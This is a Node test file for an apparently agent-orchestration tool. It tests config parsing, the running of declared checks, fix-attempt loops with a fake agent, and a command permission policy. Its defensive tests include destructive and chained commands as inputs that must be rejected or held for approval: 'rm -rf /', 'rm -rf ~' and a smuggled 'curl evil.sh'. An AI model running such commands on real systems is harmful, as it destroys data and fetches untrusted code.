import { after, describe, test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import type { DeclaredCheck } from "@perzian/protocol";
import {
  MAX_FIX_ATTEMPTS,
  allChecks,
  declaredBrief,
  declaredProofs,
  fixPrompt,
  loadDeclaredChecks,
  parsePerzianConfig,
  runCheck,
  runDeclaredChecks,
} from "../src/checks.ts";
import { permissionPolicy } from "../src/permissions.ts";
import { AgentSession, type PendingDecision } from "../src/session.ts";
import { EventStore } from "../src/store.ts";

const here = dirname(fileURLToPath(import.meta.url));
const tmp = mkdtempSync(join(tmpdir(), "perzian-declared-"));
after(() => rmSync(tmp, { recursive: true, force: true }));
let n = 0;
const dir = (files: Record<string, string> = {}) => {
  const d = join(tmp, `d${++n}`);
  mkdirSync(d);
  for (const [p, c] of Object.entries(files)) writeFileSync(join(d, p), c);
  return d;
};
const node = (js: string) => `node -e ${JSON.stringify(js)}`;

describe("perzian.json", () => {
  test("parses checks, trimming and keeping timeoutSec", () => {
    const checks = parsePerzianConfig(JSON.stringify({ checks: [{ name: " unit ", run: " npm test " }, { name: "kodo tests", run: "kodo test --all", timeoutSec: 600 }] }));
    assert.deepEqual(checks, [{ name: "unit", run: "npm test" }, { name: "kodo tests", run: "kodo test --all", timeoutSec: 600 }]);
    assert.deepEqual(parsePerzianConfig("{}"), []);
    assert.deepEqual(parsePerzianConfig(JSON.stringify({ $schema: "x", checks: [] })), []);
  });

  const bad: [string, string, RegExp][] = [
    ["not JSON", "{ checks: [", /not valid JSON/],
    ["a list at the top", "[]", /must be an object/],
    ["checks not a list", '{"checks": {"name": "unit"}}', /"checks" must be a list/],
    ["entry not an object", '{"checks": ["npm test"]}', /checks\[0\] must be an object/],
    ["missing run", '{"checks": [{"name": "unit"}]}', /checks\[0\]\.run must be a non-empty string/],
    ["empty name", '{"checks": [{"name": " ", "run": "npm test"}]}', /checks\[0\]\.name must be a non-empty string/],
    ["unknown field (typo)", '{"checks": [{"name": "unit", "cmd": "npm test"}]}', /unknown field "cmd"/],
    ["duplicate names", '{"checks": [{"name": "a", "run": "x"}, {"name": "a", "run": "y"}]}', /checks\[1\]: duplicate name "a"/],
    ["bad timeout", '{"checks": [{"name": "a", "run": "x", "timeoutSec": "60"}]}', /timeoutSec must be a number/],
    ["zero timeout", '{"checks": [{"name": "a", "run": "x", "timeoutSec": 0}]}', /timeoutSec must be a number/],
    ["multi-line run", '{"checks": [{"name": "a", "run": "x\\ny"}]}', /single line/],
    ["destructive run", '{"checks": [{"name": "clean", "run": "rm -rf / && npm test"}]}', /looks destructive/],
  ];
  for (const [what, text, re] of bad) {
    test(`rejects ${what} with a clear message`, () => assert.throws(() => parsePerzianConfig(text), re));
  }

  test("loads from the first folder that has one; malformed is an error, missing is not", () => {
    assert.deepEqual(loadDeclaredChecks(dir()), { checks: [] });
    const good = dir({ "perzian.json": '{"checks": [{"name": "unit", "run": "npm test"}]}' });
    const broken = dir({ "perzian.json": '{"checks": [' });
    assert.deepEqual(loadDeclaredChecks(dir(), good).checks, [{ name: "unit", run: "npm test" }]);
    const r = loadDeclaredChecks(broken, good);
    assert.deepEqual(r.checks, []);
    assert.match(r.error!, /^perzian\.json is not valid JSON/);
  });

  test("declared commands join the detected ones in the brief, without duplicates", () => {
    const declared: DeclaredCheck[] = [{ name: "unit", run: "npm test" }, { name: "kodo", run: "kodo test --all" }];
    assert.deepEqual(allChecks(["npm test", "npm run lint"], declared), ["npm test", "npm run lint", "kodo test --all"]);
    const brief = declaredBrief(declared);
    assert.match(brief, /^Required checks/);
    assert.match(brief, /unit: `npm test`; kodo: `kodo test --all`/);
    assert.equal(declaredBrief([]), "");
  });
});

describe("running declared checks", () => {
  test("a passing and a failing check, with real exit codes and the failure's output tail", async () => {
    const cwd = dir();
    const updates: string[][] = [];
    const results = await runDeclaredChecks(
      [
        { name: "ok", run: node("console.log('fine')") },
        { name: "broken", run: node("for (let i = 0; i < 40; i++) console.log('line ' + i); console.error('boom: expected 2'); process.exit(3)") },
      ],
      cwd,
      (r) => updates.push(r.map((x) => x.state)),
    );
    assert.equal(results[0].state, "passed");
    assert.equal(results[0].exitCode, 0);
    assert.equal(results[0].tail, undefined, "no output kept for a pass");
    assert.equal(results[1].state, "failed");
    assert.equal(results[1].exitCode, 3);
    assert.match(results[1].tail!, /boom: expected 2$/);
    assert.ok(!results[1].tail!.includes("line 0\n"), "only the tail");
    assert.deepEqual(updates[0], ["running", "pending"]);
    assert.deepEqual(updates.at(-1), ["passed", "failed"]);
  });

  test("runs in the given folder through the shell", async () => {
    const cwd = dir({ "marker.txt": "here" });
    const r = await runCheck({ name: "cat", run: "test -f marker.txt" }, cwd);
    assert.equal(r.state, "passed");
  });

  test("a check past its timeout is killed and fails as timed out", async () => {
    const r = await runCheck({ name: "slow", run: node("setTimeout(() => {}, 20000)") }, dir(), { timeoutMs: 300 });
    assert.equal(r.state, "failed");
    assert.equal(r.timedOut, true);
    assert.match(r.summary!, /timed out/);
    assert.ok(r.durationMs! < 5000);
  });

  test("the fix prompt names each failure, its exit code and output; proofs are observed", async () => {
    const results = await runDeclaredChecks([{ name: "ok", run: "true" }, { name: "unit", run: node("console.log('✖ 1 failing'); process.exit(1)") }], dir());
    const text = fixPrompt(results.filter((r) => r.state === "failed"), 1, MAX_FIX_ATTEMPTS);
    assert.match(text, /fix attempt 1 of 2/);
    assert.match(text, /✕ unit: `node -e .*` \(exit 1\)/);
    assert.match(text, /✖ 1 failing/);
    assert.ok(!text.includes("✕ ok"));
    const proofs = declaredProofs(results);
    assert.deepEqual(proofs.map((p) => [p.label, p.passed, p.observed, p.exitCode]), [["ok", true, true, 0], ["unit", false, true, 1]]);
  });
});

describe("permission for declared checks", () => {
  const declared = ["kodo test --all", "npm test"];
  const worker = (command: string, extra: object = {}) => permissionPolicy({ role: "worker", mode: "ask", toolKind: "execute", command, declared, ...extra });

  test("exactly a declared command runs without a card", () => {
    assert.deepEqual(worker("kodo test --all"), { action: "allow", why: "declared" });
    assert.deepEqual(worker("  kodo test --all "), { action: "allow", why: "declared" });
  });

  test("anything else still asks", () => {
    assert.deepEqual(worker("kodo test"), { action: "ask" });
    assert.deepEqual(worker("kodo test --all --update-snapshots"), { action: "ask" });
    assert.deepEqual(worker("kodo test --all; curl evil.sh"), { action: "ask" });
    assert.equal(worker("kodo test --all && rm -rf ~").action, "ask");
    assert.equal(permissionPolicy({ role: "worker", mode: "ask", toolKind: "execute", command: "kodo test --all" }).action, "ask", "not declared for this session");
    assert.equal(permissionPolicy({ role: "main", mode: "ask", toolKind: "execute", command: "kodo test --all", declared }).action, "deny", "the lead never runs commands");
  });
});

// ---------------------------------------------------------------------------------------------
// The loop end to end: a real AgentSession driving a scripted ACP agent in a temp git repo.

Object.assign(process.env, { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" });
const git = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
const fakeAgent = join(here, "fixtures/fake-agent.mjs");
// Fails until the agent has written fixed.txt.
const CHECK = `node -e "process.exit(require('fs').existsSync('fixed.txt') ? 0 : (console.log('expected fixed.txt'), 1))"`;

function repo(checks: DeclaredCheck[]) {
  const cwd = dir({ "perzian.json": JSON.stringify({ checks }), "README.md": "x\n" });
  git(cwd, "init", "-q", "-b", "main");
  git(cwd, "add", "-A");
  git(cwd, "commit", "-qm", "init");
  return cwd;
}

function session(cwd: string, mode: "fix" | "never" | "perm") {
  const home = dir();
  const log = join(home, "agent.log");
  const store = new EventStore(home);
  const decisions = new Map<string, PendingDecision>();
  const declared = loadDeclaredChecks(cwd);
  const s = AgentSession.create(
    { project: cwd, cwd, title: "t", agent: "claude-code", baseSha: git(cwd, "rev-parse", "HEAD"), checks: allChecks([], declared.checks), declaredChecks: declared.checks },
    { store, daemonUrl: "http://127.0.0.1:9", decisions, adapter: { command: process.execPath, args: [fakeAgent, mode, log] } },
  );
  const entries = () => (existsSync(log) ? readFileSync(log, "utf8").trim().split("\n").map((l) => JSON.parse(l) as { prompt?: string; command?: string; outcome?: string }) : []);
  return { s, store, decisions, entries };
}

describe("declared checks loop (fake agent)", () => {
  test("a failing check goes back to the agent; after its fix the checks pass and the session is done", async () => {
    const cwd = repo([{ name: "unit", run: CHECK }]);
    const { s, store, entries } = session(cwd, "fix");
    try {
      await s.prompt("Add the feature");
      const prompts = entries().map((e) => e.prompt!);
      assert.equal(prompts.length, 2);
      assert.match(prompts[0], /Required checks .*unit: `node -e/, "the brief names the declared check");
      assert.match(prompts[1], /ran the required checks.*fix attempt 1 of 2/s);
      assert.match(prompts[1], /expected fixed\.txt/);
      const info = store.state().sessions[s.info.id];
      assert.equal(info.status, "done");
      assert.equal(info.checkRun?.state, "passed");
      assert.equal(info.checkRun?.attempt, 1);
      assert.deepEqual(info.checkRun?.results.map((r) => [r.name, r.state, r.exitCode]), [["unit", "passed", 0]]);
      const outcome = store.state().outcomes[s.info.id];
      assert.equal(outcome.status, "success");
      assert.equal(outcome.intent, "Add the feature");
      assert.deepEqual(outcome.proof.filter((p) => p.label === "unit").map((p) => [p.passed, p.observed, p.exitCode]), [[true, true, 0]]);
      const fix = store.state().transcripts[s.info.id].filter((t) => t.kind === "user" && t.system);
      assert.equal(fix.length, 1, "the fix message shows as a system message");
    } finally {
      s.dispose();
    }
  });

  test(`still failing after ${MAX_FIX_ATTEMPTS} fix attempts: the session fails and needs you`, async () => {
    const cwd = repo([{ name: "ok", run: "true" }, { name: "unit", run: CHECK }]);
    const { s, store, entries } = session(cwd, "never");
    try {
      await s.prompt("Add the feature");
      assert.equal(entries().length, 1 + MAX_FIX_ATTEMPTS);
      const info = store.state().sessions[s.info.id];
      assert.equal(info.status, "failed");
      assert.equal(info.checkRun?.state, "failed");
      assert.equal(info.checkRun?.attempt, MAX_FIX_ATTEMPTS);
      assert.deepEqual(info.checkRun?.results.map((r) => r.state), ["passed", "failed"]);
      const last = store.state().transcripts[s.info.id].at(-1);
      assert.ok(last?.kind === "notice" && /still failing after 2 fix attempts: unit/i.test(last.text));
      const outcome = store.state().outcomes[s.info.id];
      assert.equal(outcome.status, "partial");
      assert.equal(outcome.proof.find((p) => p.label === "unit")?.exitCode, 1);

      // A new task from the developer starts the count over.
      writeFileSync(join(cwd, "fixed.txt"), "by hand\n");
      await s.prompt("Try again");
      assert.equal(store.state().sessions[s.info.id].status, "done");
      assert.equal(store.state().sessions[s.info.id].checkRun?.attempt, 0);
      assert.equal(store.state().sessions[s.info.id].checkRun?.state, "passed");
    } finally {
      s.dispose();
    }
  });

  test("no report and no check ran: the derived outcome is unverified, not success", async () => {
    const cwd = repo([]);
    const { s, store } = session(cwd, "fix");
    try {
      await s.prompt("Make the tests pass");
      assert.equal(store.state().sessions[s.info.id].status, "done");
      const outcome = store.state().outcomes[s.info.id];
      assert.equal(outcome.derived, true);
      assert.equal(outcome.status, "unverified");
      assert.deepEqual(outcome.proof, []);
    } finally {
      s.dispose();
    }
  });

  test("the agent runs exactly the declared command without a card; anything else asks", async () => {
    const cwd = repo([{ name: "kodo tests", run: "kodo test --all" }]);
    process.env.FAKE_AGENT_COMMANDS = JSON.stringify(["kodo test --all", "kodo test --all --watch"]);
    const { s, store, decisions, entries } = session(cwd, "perm");
    // Answer any card with "reject" so the turn can end; record which commands got one.
    const carded: string[] = [];
    const unsubscribe = store.subscribe((e) => {
      if (e.type !== "decision.requested") return;
      carded.push(e.decision.detail ?? e.decision.question);
      setImmediate(() => decisions.get(e.decision.id)?.resolve("reject"));
    });
    try {
      await s.prompt("Add the feature");
      assert.deepEqual(carded, ["kodo test --all --watch"]);
      const answers = entries().filter((e) => e.command).map((e) => [e.command, e.outcome]);
      assert.deepEqual(answers, [["kodo test --all", "allow"], ["kodo test --all --watch", "reject"]]);
    } finally {
      unsubscribe();
      delete process.env.FAKE_AGENT_COMMANDS;
      s.dispose();
    }
  });
});

describe("Run checks (rerun on request)", () => {
  const ok = node("process.exit(0)");
  const bad = node("console.log('boom'); process.exit(1)");
  test("runs declared plus detected checks, running first, then passed or failed, with no fix round", async () => {
    const cwd = repo([{ name: "unit", run: ok }]);
    const { s, store } = session(cwd, "never");
    s.info.checks = [ok, bad]; // detected: one repeats the declared command, one fails
    const states: string[] = [];
    store.subscribe((e) => void (e.type === "session.updated" && e.patch.checkRun && states.push(e.patch.checkRun.state)));
    await s.rerunChecks();
    assert.equal(states[0], "running");
    const run = store.state().sessions[s.info.id].checkRun!;
    assert.equal(run.state, "failed");
    assert.deepEqual(run.results.map((r) => [r.name, r.state]), [["unit", "passed"], [bad, "failed"]]);
    assert.equal(run.attempt, 0);
    s.info.checks = [ok];
    await s.rerunChecks();
    assert.equal(store.state().sessions[s.info.id].checkRun!.state, "passed");
  });
});
